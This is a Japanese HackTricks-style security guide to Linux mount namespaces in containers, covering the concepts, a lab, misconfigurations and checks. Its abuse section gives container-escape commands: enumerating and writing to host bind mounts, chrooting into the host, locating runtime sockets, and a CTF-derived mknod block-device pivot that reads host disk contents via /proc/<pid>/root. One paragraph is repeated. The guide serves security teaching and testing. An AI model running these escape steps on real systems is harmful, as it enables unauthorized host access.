# マウントネームスペース

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

マウントネームスペースはプロセスが見る**マウントテーブル**を制御します。これはコンテナ隔離の最重要機能の一つで、ルートファイルシステム、bind mounts、tmpfs mounts、procfs のビュー、sysfs の露出、および多くのランタイム固有のヘルパーマウントがすべてそのマウントテーブルで表現されるためです。2つのプロセスが同じく `/`, `/proc`, `/sys`, または `/tmp` にアクセスできても、それらのパスが何を指すかは所属するマウントネームスペースによって決まります。

コンテナセキュリティの観点では、マウントネームスペースは「これは整えられたアプリケーション用ファイルシステムである」と「このプロセスがホストのファイルシステムを直接参照または操作できる」の違いを生むことが多い。だからこそ bind mounts、`hostPath` ボリューム、特権付きマウント操作、書き込み可能な `/proc` や `/sys` の露出はすべてこのネームスペースに関わります。

## 動作

ランタイムがコンテナを起動するとき、通常は新しいマウントネームスペースを作成し、コンテナ向けのルートファイルシステムを準備し、必要に応じて procfs やその他のヘルパーファイルシステムをマウントし、さらにオプションで bind mounts、tmpfs mounts、secrets、config maps、または host paths を追加します。プロセスがそのネームスペース内で動作し始めると、プロセスが見るマウントの集合はホストのデフォルトビューから大きく切り離されます。ホストは依然として実際の基盤ファイルシステムを見ているかもしれませんが、コンテナはランタイムが組み立てたバージョンを見ます。

これは強力で、ホストがすべてを管理しているにもかかわらずコンテナに独自のルートファイルシステムがあると信じさせることができます。一方で危険でもあります。ランタイムが誤ったマウントを露出すると、プロセスは突然ホストのリソースを可視化し、既存のセキュリティモデルが保護するよう設計されていない領域にアクセスできるようになる可能性があるためです。

## ラボ

プライベートなマウントネームスペースは次のように作成できます：
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
もしその名前空間の外で別のシェルを開いてmount tableを確認すると、tmpfs mountはisolated mount namespaceの内部にのみ存在することがわかります。これは有益な演習です—mount isolationが抽象的な理論ではなく、カーネルがプロセスに対して文字通り異なるmount tableを提示していることを示します。

もしその名前空間の外で別のシェルを開いてmount tableを確認すると、tmpfs mountはisolated mount namespaceの内部にのみ存在します。

コンテナ内では、簡単な比較は次のとおりです:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
二つ目の例は、ランタイム設定がファイルシステムの境界に大きな穴を空けてしまうのがいかに容易かを示しています。

## ランタイムでの利用

Docker、Podman、containerd ベースのスタック、そして CRI-O は通常のコンテナでプライベートなマウント名前空間に依存しています。Kubernetes は同じ仕組みを利用して、volumes、projected secrets、config maps、そして `hostPath` マウントを実現しています。Incus/LXC 環境もマウント名前空間を多用しており、特に system containers は application containers よりもリッチでマシンに近いファイルシステムを公開することが多いです。

つまり、コンテナのファイルシステムの問題を調査する際、多くの場合それは単なる Docker の癖ではありません。起動に使われたプラットフォームを通じて表現された、マウント名前空間とランタイム設定の問題を見ているのです。

## 誤設定

最も明白かつ危険なミスは、ホストのルートファイルシステムや他のセンシティブなホストパスを bind mount で公開してしまうことです。例えば `-v /:/host` や Kubernetes における書き込み可能な `hostPath` などです。その時点で問題はもはや「コンテナが何とか脱出できるか？」ではなく「どれだけの有用なホストの内容が既に直接見えていて書き込み可能か？」になります。書き込み可能なホストの bind mount は、残りのエクスプロイトをファイル配置、chroot、設定改変、あるいはランタイムソケットの発見といった単純な作業に変えてしまうことが多いです。

別のよくある問題は、ホストの `/proc` や `/sys` をコンテナ側のより安全なビューをバイパスする形で公開してしまうことです。これらのファイルシステムは通常のデータマウントではなく、カーネルやプロセスの状態へのインターフェイスです。ワークロードがホスト側のそれらに直接到達すると、コンテナハードニングの前提の多くがもはや適切に適用されなくなります。

読み取り専用の保護も重要です。ルートファイルシステムを読み取り専用にするだけでコンテナが魔法のように安全になるわけではありませんが、多くの攻撃者のステージング領域を削り、永続化、ヘルパーバイナリの配置、設定の改ざんを難しくします。逆に、書き込み可能なルートや書き込み可能なホストの bind mount は、攻撃者に次の手を準備する余地を与えてしまいます。

## 悪用

マウント名前空間が誤用されると、攻撃者は一般に次の四つのうちいずれかを行います。**コンテナ外にとどめておくべきホストのデータを読み取る**。**書き込み可能な bind mount を介してホストの設定を変更する**。**capabilities や seccomp が許すなら追加のリソースをマウントまたは再マウントする**。あるいは **強力なソケットやランタイムの状態ディレクトリに到達し、コンテナプラットフォーム自体により多くのアクセスを要求する**。

コンテナがすでにホストのファイルシステムを見られる場合、残りのセキュリティモデルは即座に変わります。

ホストの bind mount を疑う場合、まず何が見えているか、書き込み可能かどうかを確認してください：
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
ホストのルートファイルシステムが読み書き可能にマウントされている場合、直接ホストにアクセスすることはしばしば次のように簡単です:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
目的が直接 chroot することではなく、特権付きのランタイムアクセスである場合は、ソケットやランタイム状態を列挙する:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
もし `CAP_SYS_ADMIN` が存在する場合、コンテナ内から新しいマウントを作成できるかどうかも確認してください:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 完全な例: Two-Shell `mknod` Pivot

container root user が block devices を作成でき、host と container が有用な形で user identity を共有し、attacker がすでに host 上に low-privilege foothold を持っている場合、より特殊な悪用経路が発生します。その状況では、container は `/dev/sda` のような device node を作成でき、low-privilege host user は対応する container process の `/proc/<pid>/root/` を通じて後でそれを読み取ることができます。

container 内:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
ホスト上で、container shell PID を特定した後、該当する low-privilege user として:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
重要な教訓は、正確な CTF の文字列検索そのものではありません。ポイントは、mount-namespace が `/proc/<pid>/root/` を通じて露出すると、cgroup device ポリシーがコンテナ内部での直接使用を防いでいても、host ユーザが container-created device nodes を再利用できてしまう、という点です。

## チェック

これらのコマンドは、現在のプロセスが実際に存在しているファイルシステムのビューを表示するためのものです。目的は、host-derived mounts、書き込み可能な機密性の高いパス、または通常の application container root filesystem よりも広く見えるものを見つけることです。
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
What is interesting here:

- ホストからの Bind mounts、特に `/`, `/proc`, `/sys`、runtime state ディレクトリ、またはソケットの場所は、すぐに目立つはずです。
- 予期せぬ read-write mounts は、通常、多数の read-only helper mounts よりも重要です。
- `mountinfo` は、あるパスが本当にホスト由来か overlay-backed かを確認するための最良の場所であることが多い。

これらのチェックで、**この namespace 内でどのリソースが見えているか**、**どれがホスト由来か**、および **どれが書き込み可能またはセキュリティ上敏感か** を把握できます。
{{#include ../../../../../banners/hacktricks-training.md}}
